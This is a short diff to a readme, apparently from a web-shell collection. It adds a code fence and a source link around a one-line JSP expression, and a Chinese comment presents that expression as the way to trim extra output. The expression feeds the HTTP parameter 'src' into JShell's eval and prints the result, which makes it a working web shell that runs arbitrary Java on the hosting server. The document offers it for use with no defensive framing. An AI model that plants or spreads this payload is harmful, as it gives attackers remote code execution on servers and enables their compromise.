@@ -6,5 +6,8 @@ readme
 
 如果强迫症想撸掉多余的输出：
 
-
+```
 <%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", "")%>
+```
+
+from: http://p2j.cn/?p=1874
